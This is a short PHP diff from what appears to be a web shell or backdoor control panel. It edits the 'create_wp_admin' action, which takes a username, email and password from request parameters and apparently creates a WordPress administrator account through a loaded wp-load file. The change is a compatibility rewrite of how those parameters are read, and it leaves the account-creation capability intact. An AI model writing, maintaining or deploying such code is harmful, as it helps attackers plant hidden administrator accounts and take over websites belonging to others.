@@ -393,9 +393,9 @@ else if ($ne == 'set_wp_load') {
 	}
 }
 else if ($ne == 'create_wp_admin') {
-	$username = $_GET['wp_username'] ?? $_POST['wp_username'];
-	$email = $_GET['wp_email'] ?? $_POST['wp_email'];
-	$password = $_GET['wp_password'] ?? $_POST['wp_password'];
+	$username = isset($_GET['wp_username']) ? $_GET['wp_username'] : $_POST['wp_username'];
+	$email = isset($_GET['wp_email']) ? $_GET['wp_email'] : $_POST['wp_email'];
+	$password = isset($_GET['wp_password']) ? $_GET['wp_password'] : $_POST['wp_password'];
 
 	try {
 		if (isset($_SESSION['gr_wp_load']) && file_exists($_SESSION['gr_wp_load'])) {
